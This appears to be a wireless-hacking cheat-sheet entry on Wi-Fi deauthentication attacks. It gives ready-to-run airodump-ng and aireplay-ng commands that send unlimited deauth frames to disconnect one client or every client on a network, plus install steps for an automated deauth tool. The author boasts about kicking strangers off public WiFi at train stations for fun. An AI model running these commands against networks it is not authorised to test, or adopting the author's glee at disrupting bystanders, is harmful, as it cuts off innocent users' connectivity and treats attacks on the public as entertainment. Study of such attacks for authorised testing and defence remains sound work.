---
title: Deauthentication Attack
category: wireless
subcategory: sub-03
os: linux
command: aireplay-ng --deauth 0 -a <BSSID of ROUTER> -c <STATION BSSID> -i wlan1
tools: airodump-ng, aireplay-ng, KawaiiDeauther
---


## Deauthentication Attack

The coolest thing about network attacks, and the simplest. Kick everyone off a given network. I loved doing this at train stations back in the day when people connected to public WiFi. Just walking around the station – the look of frustration was priceless.

### Scanning and Monitoring

```bash
airodump-ng wlan1
airodump-ng -c <channel> --bssid <target mac> wlan1
```

The first command starts the network scan. Once we select the channel and BSSID address of the network, we enter the second command. Leave this command enabled in the terminal window. We'll be able to monitor devices connected to the network.

### Deauthenticating Users

```bash
aireplay-ng --deauth 0 -a <BSSID of ROUTER> -c <STATION BSSID> -i wlan1
aireplay-ng --deauth 0 -a <BSSID of ROUTER> -i wlan1
```

The first command disconnects a specific user, and the second disconnects everyone on a specific network.

Below you'll find the exact translation of this command:

- `-deauth 0` — specifies that an infinite number of deauthentication frames should be sent (until you terminate the process)
- `a <BSSID of ROUTER>` — the MAC address (BSSID) of the access point (i.e., router or AP)
- `c <STATION BSSID>` — the MAC address of the client connected to this Wi-Fi network

### KawaiiDeauther - Automated Tool

You can also use an automated tool for this purpose. I highly recommend it. It's very convenient.

```bash
git clone https://github.com/aryanrtm/KawaiiDeauther
cd KawaiiDeauther && sudo ./install.sh
sudo KawaiiDeauther.sh
```